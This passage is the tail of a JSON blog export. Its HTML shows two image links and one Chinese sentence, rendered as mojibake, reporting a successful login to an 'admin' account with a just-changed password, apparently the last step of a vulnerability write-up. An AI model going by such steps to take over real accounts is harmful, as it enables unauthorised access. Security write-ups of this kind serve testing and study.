data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci4e.png\" alt=\"\"></p>\n<p>ç™»é™† admin è´¦æˆ·è¾“å…¥åˆšæ‰æ›´æ”¹çš„å¯†ç æˆåŠŸç™»é™†</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci5.png\" alt=\"\"></p>\n",
            "tags": []
        }
    ]
}